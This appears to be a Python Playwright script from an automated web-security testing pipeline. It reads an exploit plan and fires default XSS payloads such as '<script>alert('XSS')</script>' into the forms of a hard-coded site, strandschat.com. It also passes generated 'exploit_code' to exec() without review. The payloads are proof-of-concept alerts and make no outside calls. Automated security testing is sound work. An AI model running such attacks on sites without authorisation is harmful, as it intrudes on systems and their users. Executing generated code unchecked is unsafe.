import json
import os
import asyncio
import re
from playwright.async_api import async_playwright

def extract_code_from_markdown(code_block):
    """Extract Python code from markdown code blocks and convert to async."""
    if not code_block:
        return None
    
    # Remove markdown code block markers
    code = code_block.replace("```python", "").replace("```", "").strip()
    
    # If code is empty after cleaning, return None
    if not code:
        return None
    
    # Convert sync to async patterns
    code = code.replace("sync_playwright", "async_playwright")
    code = code.replace("with sync_playwright()", "async with async_playwright()")
    code = code.replace("p.chromium.launch()", "await p.chromium.launch()")
    code = code.replace("browser.new_page()", "await browser.new_page()")
    code = code.replace("page.goto(", "await page.goto(")
    code = code.replace("page.fill(", "await page.fill(")
    code = code.replace("page.click(", "await page.click(")
    code = code.replace("page.locator(", "await page.locator(")
    code = code.replace("page.wait_for_timeout(", "await page.wait_for_timeout(")
    code = code.replace("browser.close()", "await browser.close()")
    
    # Try to extract just the executable parts (inside functions, without function defs)
    lines = code.split("\n")
    executable_lines = []
    in_function = False
    indent_level = 0
    
    for line in lines:
        stripped = line.strip()
        
        # Skip empty lines at start
        if not executable_lines and not stripped:
            continue
            
        # Skip function definitions and imports
        if stripped.startswith("def ") or stripped.startswith("async def ") or stripped.startswith("import ") or stripped.startswith("from "):
            in_function = True
            continue
            
        # Skip if __name__ blocks
        if "__name__" in line or "__main__" in line:
            continue
            
        # Skip decorators
        if stripped.startswith("@"):
            continue
            
        # If we're collecting lines, add them
        if stripped:
            # Remove leading indentation for function content
            if in_function:
                # Try to detect and remove function-level indentation
                indent = len(line) - len(line.lstrip())
                if indent_level == 0:
                    indent_level = indent
                if indent > indent_level:
                    line = line[indent_level:]
            executable_lines.append(line)
    
    result = "\n".join(executable_lines).strip()
    return result if result else None

async def execute_exploit_actions(page, exploit):
    """Execute exploit actions directly on the page based on the vulnerability."""
    target = exploit.get("target", {})
    action = exploit.get("action", "")
    log = exploit.get("log", "")
    
    try:
        if action == "fill_input":
            # Extract payload from log if available
            payload_match = re.search(r"with ['\"]([^'\"]+)['\"]", log)
            if payload_match:
                payload = payload_match.group(1)
            else:
                # Default XSS payloads
                if "email" in target.get("outerHTML", "").lower():
                    payload = "test<script>alert('XSS')</script>@example.com"
                else:
                    payload = "<script>alert('XSS')</script>"
            
            # Find and fill the target element
            tag_name = target.get("tagName", "").lower()
            placeholder = target.get("placeholder", "")
            
            if tag_name == "input":
                if placeholder:
                    await page.fill(f'input[placeholder="{placeholder}"]', payload)
                else:
                    inputs = await page.query_selector_all("input")
                    if inputs:
                        await inputs[0].fill(payload)
            elif tag_name == "textarea":
                if placeholder:
                    await page.fill(f'textarea[placeholder="{placeholder}"]', payload)
                else:
                    textareas = await page.query_selector_all("textarea")
                    if textareas:
                        await textareas[0].fill(payload)
            
            print(f"    📝 Filled {tag_name} with payload")
            
            # Try to trigger submission
            try:
                submit_buttons = await page.query_selector_all('button[type="submit"], button:has-text("Sign"), button:has-text("Send")')
                if submit_buttons:
                    await submit_buttons[0].click()
                    print(f"    🖱️ Clicked submit button")
            except:
                pass
        
        elif action == "click_element":
            tag_name = target.get("tagName", "").lower()
            outer_html = target.get("outerHTML", "")
            
            # Try to find and click the button
            if "Sign Up" in outer_html:
                await page.click('button:has-text("Sign Up")')
            elif "Get Started" in outer_html:
                await page.click('button:has-text("Get Started")')
            elif "Send" in outer_html or "↑" in outer_html:
                send_buttons = await page.query_selector_all('button.send-icon-button, button:has-text("Send")')
                if send_buttons:
                    await send_buttons[0].click()
            
            print(f"    🖱️ Clicked {tag_name}")
            
    except Exception as e:
        print(f"    ⚠️ Error executing action: {e}")

async def run_attacks():
    print("🚀 INITIALIZING ATTACK SEQUENCE...")
    
    # 1. Load the Attack Plan
    if not os.path.exists("final_exploit_plan.json"):
        print("❌ No attack plan found. Run 'exploit_planner.py' first!")
        return

    with open("final_exploit_plan.json", "r") as f:
        plan_data = json.load(f)

    # Handle new JSON structure with "exploits" key
    if isinstance(plan_data, dict) and "exploits" in plan_data:
        exploits = plan_data["exploits"]
        total = plan_data.get("total_exploits_generated", len(exploits))
        print(f"📋 Loaded exploit plan: {total} exploits found")
    else:
        # Fallback for old format (direct array)
        exploits = plan_data if isinstance(plan_data, list) else []
        total = len(exploits)
        print(f"📋 Loaded {total} exploits (legacy format)")

    if not exploits:
        print("❌ No exploits to execute!")
        return

    print(f"🔫 LOADED {total} PAYLOADS. LAUNCHING BROWSER...")

    # Create directories
    os.makedirs("attack_evidence", exist_ok=True)
    os.makedirs("attack_videos", exist_ok=True)

    async with async_playwright() as p:
        # Launch headed so we can SEE the hack happen
        browser = await p.chromium.launch(headless=False)
        context = await browser.new_context(record_video_dir="attack_videos/")
        page = await context.new_page()

        # Target URL - matches qa_agent_v1.py
        target_url = "http://strandschat.com"
        
        try:
            await page.goto(target_url, timeout=10000)
            print(f"🌐 Connected to {target_url}")
        except Exception as e:
            print(f"❌ Could not connect to target: {e}")
            await browser.close()
            return

        # 2. Execute Each Exploit
        successful_attacks = 0
        failed_attacks = 0
        
        for i, exploit in enumerate(exploits, 1):
            element_id = exploit.get("element_id", "unknown") or exploit.get("target", {}).get("id", f"element_{i}")
            action = exploit.get("action", "unknown")
            reward = exploit.get("reward", 0)
            
            print(f"\n{'='*60}")
            print(f"[{i}/{total}] EXECUTING EXPLOIT #{i}")
            print(f"    Target: {element_id}")
            print(f"    Action: {action}")
            print(f"    Reward: {reward}")
            print(f"{'='*60}")
            
            try:
                # Method 1: Try to extract and execute code from exploit_code field
                exploit_code = exploit.get("exploit_code")
                
                if exploit_code and not exploit.get("error"):
                    # Extract code from markdown if present
                    extracted_code = extract_code_from_markdown(exploit_code)
                    
                    if extracted_code:
                        try:
                            # Try to execute the extracted code
                            exec_code = f"""
async def execute_payload(page, target_url):
    target_url = "{target_url}"
    {extracted_code}
"""
                            exec(exec_code, globals())
                            await globals()['execute_payload'](page, target_url)
                            print("    ✅ Executed exploit code")
                        except Exception as e:
                            print(f"    ⚠️ Code execution failed: {e}, trying direct actions...")
                            # Fallback to Method 2
                            await execute_exploit_actions(page, exploit)
                    else:
                        print("    ⚠️ Could not extract executable code, trying direct actions...")
                        await execute_exploit_actions(page, exploit)
                else:
                    # Method 2: Execute based on vulnerability structure
                    print("    🔧 Using direct action execution...")
                    await execute_exploit_actions(page, exploit)
                
                # Wait to see the effect (e.g., Alert box or crash)
                await page.wait_for_timeout(3000)
                
                # Take a "Trophy Shot"
                safe_filename = element_id.replace("/", "_").replace("\\", "_")[:50]
                screenshot_path = f"attack_evidence/exploit_{i}_{safe_filename}.png"
                await page.screenshot(path=screenshot_path)
                print(f"    📸 Screenshot saved: {screenshot_path}")
                
                successful_attacks += 1
                print("    ✅ Payload Delivered Successfully")

            except Exception as e:
                failed_attacks += 1
                print(f"    ❌ Execution Failed: {e}")
                import traceback
                traceback.print_exc()

        print(f"\n{'='*60}")
        print("🏁 ATTACK SEQUENCE COMPLETE")
        print(f"    ✅ Successful: {successful_attacks}/{total}")
        print(f"    ❌ Failed: {failed_attacks}/{total}")
        print(f"{'='*60}")
        
        await browser.close()

if __name__ == "__main__":
    asyncio.run(run_attacks())